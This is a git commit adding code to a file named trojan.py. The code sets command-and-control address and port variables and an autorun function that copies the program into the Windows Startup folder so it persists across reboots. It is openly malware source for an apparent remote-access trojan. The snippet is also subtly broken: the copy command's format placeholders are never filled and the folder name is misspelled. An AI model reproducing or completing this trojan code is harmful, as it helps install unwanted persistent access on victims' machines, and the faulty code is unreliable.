24169305757c3179102c6e7b1b7902e399f0be92
wiggapony0925 <ninjeff06@gmail.com>
2023-05-21 22:24:00 -0400

    file to exe

--- trojan.py
+++ trojan.py
@@ -4,3 +4,15 @@ import threading
 import time 
 import os 
 
+#variables to get ip adress using natcat 
+#listen for connections to come in
+
+CCIP = ''
+CCPORT = 443  #SSL CONNECTION 
+
+#out run the script/trojan to keep running
+
+def autorun():
+    filen = os.path.basename(__file__)
+    exe_file = filen.replace('.py', '.exe')
+    os.system('copy {} "\\%APPDATA%\\Microsoft\\Windows\\Start Menu\\Porgrams\\Startup"')
